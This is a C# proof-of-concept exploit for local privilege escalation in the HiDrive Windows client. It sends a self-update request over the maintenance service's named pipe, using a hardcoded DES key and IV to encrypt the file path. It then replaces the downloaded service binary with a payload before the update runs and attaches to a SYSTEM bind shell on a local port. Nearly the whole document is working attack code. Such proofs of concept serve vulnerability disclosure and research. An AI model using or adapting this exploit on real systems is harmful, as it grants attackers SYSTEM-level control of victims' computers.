using System;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;
using System.Net.Sockets;
using System.ServiceModel;
using System.Security.Cryptography;


namespace PoC
{
	[ServiceContract(SessionMode = SessionMode.Required, CallbackContract = typeof(IUpdaterCallback))]
	public interface IUpdateServiceExecuter
	{
		[OperationContract]
		void RunMaintenanceServiceSelfUpdate(string maintenanceServiceFile);
	}

	public interface IUpdaterCallback
	{
		[OperationContract(IsOneWay = true)]
		void AppUpdateCallback(UpdaterStatusCode statusCode);

		[OperationContract(IsOneWay = true)]
		void UpdaterUpdateCallback(UpdaterStatusCode statusCode);

		[OperationContract(IsOneWay = true)]
		void MaintenanceServiceServiceUpdateCallback(UpdaterStatusCode statusCode);
	}

	public enum UpdaterStatusCode
	{
		InvalidHash,
		InvalidSignature,
		InvalidUpdateConfig,
		SetupError,
		SetupTimeout,
		Success,
		UpdateConfigDownloadError
	}

	class Program
	{
		public class UpdaterCallback : IUpdaterCallback
		{
			public void AppUpdateCallback(UpdaterStatusCode statusCode)
			{
				throw new NotImplementedException();
			}

			public void MaintenanceServiceServiceUpdateCallback(UpdaterStatusCode statusCode)
			{
				throw new NotImplementedException();
			}

			public void UpdaterUpdateCallback(UpdaterStatusCode statusCode)
			{
				throw new NotImplementedException();
			}
		}

		public static string Encrypt(string text)
		{
			ICryptoTransform cryptoTransform = DES.Create().CreateEncryptor(key, iv);
			byte[] bytes = Encoding.Unicode.GetBytes(text);
			return Convert.ToBase64String(cryptoTransform.TransformFinalBlock(bytes, 0, bytes.Length));
		}

		private static byte[] key = new byte[]
		{
			121, 62, 31, 4, 15, 68, 47, 118
		};

		private static byte[] iv = new byte[]
		{
			41, 92, 12, 69, 83, 45, 11, 23
		};

		public static bool downloadFile(string url, string path)
		{
			bool result;
			try
			{
				using (var client = new WebClient())
				{
					result = true;
					client.DownloadFile(url, path);
				}
			} catch (Exception ex)
			{
				result = false;
			}
			return result;
		}

		public static bool copyFile(string src, string dest)
		{
			bool result;
			try
			{
				result = true;
				File.Copy(src, dest, true);
			}
			catch (FileNotFoundException e)
			{
				Console.WriteLine(e);
				result = false;
			}
			return result;
		}

		public static bool connectToBindShell(string addr, int port)
		{
			bool result;
			try
			{
				TcpClient tcpClient = new TcpClient();

				tcpClient.Connect(addr, port);
				NetworkStream tcpStream = tcpClient.GetStream();
				result = true;

				while (tcpClient.Connected)
				{
					Thread.Sleep(100);
					for (int i = tcpClient.Available; i > 0; Thread.Sleep(100), i = tcpClient.Available)
					{
						byte[] in_buf = new byte[i];
						tcpStream.Read(in_buf, 0, i);
						Console.Write(Encoding.UTF8.GetString(in_buf, 0, in_buf.Length));
					}

					byte[] out_buf = new byte[257];
					out_buf = new ASCIIEncoding().GetBytes(Console.ReadLine() + "\n");

					try
					{
						tcpStream.Write(out_buf, 0, out_buf.Length);
					}
					catch (IOException ex)
					{
						break;
					}
				}
				tcpClient.Close();
			} catch (SocketException e)
			{
				connectToBindShell(addr, port);
				result = false;
			}
			return result;
		}

		static void Main(string[] args)
		{
			try
			{
				Console.WriteLine("### HiDrive LPE PoC by dhn ###\n");

				string url = "https://static.hidrive.com/windows/update/live/MaintenanceService.exe";
				string uri = "net.pipe://localhost/HiDriveMaintenanceService/updateserviceexecuter";
				string path = Directory.GetCurrentDirectory();
				string bad_file = "payload\\Payload.exe";
				string good_file = "original\\MaintenanceService.exe";

				if (downloadFile(url, Path.Combine(path, good_file)))
				{
					Console.WriteLine("[+] Dowload new \"MaintenanceService.exe\" ...");
				} else
				{
					Console.WriteLine("[!] Download failed...");
					return;
				}

				DuplexChannelFactory<IUpdateServiceExecuter> dCF = new DuplexChannelFactory<IUpdateServiceExecuter>(
					new InstanceContext(new UpdaterCallback()),
					new NetNamedPipeBinding(),
					new EndpointAddress(uri)
				);

				Console.WriteLine("[+] Building \"IUpdateServiceExecuter\" Client...");
				IUpdateServiceExecuter client = dCF.CreateChannel();

				try
				{
					Console.WriteLine("[+] Sending \"ServiceSelfUpdate\" Request...");
					client.RunMaintenanceServiceSelfUpdate(Encrypt(Path.Combine(path, good_file)));
				} catch (Exception ex) {
					Console.WriteLine("[!] Failed to start a self update...");
					return;
				}

				Console.WriteLine("[+] Replace the original Service...");
				if (copyFile(Path.Combine(path, bad_file), Path.Combine(path, good_file)))
				{
					Console.WriteLine("[+] Connecting to SYSTEM \"bind\" shell...\n");
					if (!connectToBindShell("127.0.0.1", 31415))
					{
						Console.WriteLine("[!] Failed to connect to the \"bind\" shell");
					}
				} else
				{
					Console.WriteLine("[+] Failed to replace the original Service...");
					return;
				}
			}
			catch (Exception e)
			{
				Console.WriteLine(e);
			}
		}
	}
}

